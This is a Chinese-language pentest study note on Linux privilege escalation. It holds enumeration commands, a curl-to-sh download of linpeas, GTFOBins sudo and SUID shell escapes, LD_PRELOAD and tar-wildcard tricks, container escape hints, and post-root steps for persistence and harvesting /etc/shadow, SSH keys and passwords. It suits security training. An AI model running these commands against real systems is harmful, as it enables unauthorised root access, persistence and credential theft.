# Linux 权限提升

## 1. 知识点讲解

提权 = 找到「以高权限运行的东西里可被低权限影响的输入」。攻击面四类：配置错误（sudo/SUID/cron/文件权限）、内核漏洞、服务漏洞、凭据复用。80% 的提权来自配置错误，先枚举再谈 0day。

## 2. 信息枚举（先跑脚本，再人工复核）

```bash
# 自动化
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linenum.sh; ./linuxprivchecker.py

# 人工核心清单
id; sudo -l                        # sudo 权限（最高频提权点）
find / -perm -4000 -type f 2>/dev/null        # SUID
getcap -r / 2>/dev/null            # capabilities
ls -la /etc/cron*; cat /etc/crontab            # 计划任务
cat /etc/passwd; ls -la /home/*/; history      # 用户与历史
ss -lntp; ps aux --forest          # 本地服务与进程（找 root 跑的自定义服务）
mount; cat /etc/exports            # NFS no_root_squash
uname -a; cat /etc/*release        # 内核与发行版 → 匹配 09-02
env; cat ~/.bash_history; grep -r "password" /var/www/ 2>/dev/null   # 凭据
```

## 3. 高频提权路径

### sudo -l 能跑的命令 → GTFOBins 查逃逸
```bash
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile → !sh
sudo /usr/bin/git -p help config → !/bin/sh
# LD_PRELOAD 保留（env_keep）时：
sudo LD_PRELOAD=/tmp/evil.so any_command
```

### SUID/GTFOBins
```bash
find / -perm -4000 2>/dev/null
# 例：SUID 的 find/cp/tar/python 都可提权（gtfobins.github.io 对照）
/usr/bin/find . -exec /bin/sh -p \; -quit
```

### cron 与可写路径
- root 的 cron 调用的脚本可写 → 写入反弹命令。
- cron 调用脚本用了相对路径/通配符 → PATH 劫持、tar 通配符注入（`--checkpoint-action=exec=sh x.sh`）。
- pspy64 监听无权限的进程与定时任务： `./pspy64 -pf -i 1000`。

### capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid 的 python/perl → 直接 setuid(0)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### NFS no_root_squash
挂载端编译 SUID 二进制放上去，目标执行即 root。

### 内核漏洞
对照 `09_漏洞库/02-提权漏洞速查.md`；原则：先备份通道再跑 exp（内核 exp 可能打崩机器），优先选有「影响版本表 + 稳定 PoC」的洞。

## 4. 容器内判断与出路

```bash
ls /.dockerenv; cat /proc/1/cgroup | grep -E "docker|kubepods"
# 出路：特权容器直接挂载宿主机盘；docker.sock 挂载 → 起新特权容器逃逸；详见 08 分册
```

## 5. 提权后固化

- 写 ssh key 到 root、新建 sudo 用户（隐蔽方法见 07 分册）。
- 收集：/etc/shadow、ssh 私钥、应用配置中的数据库口令——这些是横向弹药（05-02）。

## 自测锚点

- [ ] 拿到低权 shell，能在 10 分钟内完成 linpeas + 人工六项枚举。
- [ ] 看到任意 `sudo -l` 输出，能立即给出对应 GTFOBins 逃逸命令。
- [ ] 能解释为什么 tar 通配符 cron 提权有效，并写出利用文件。
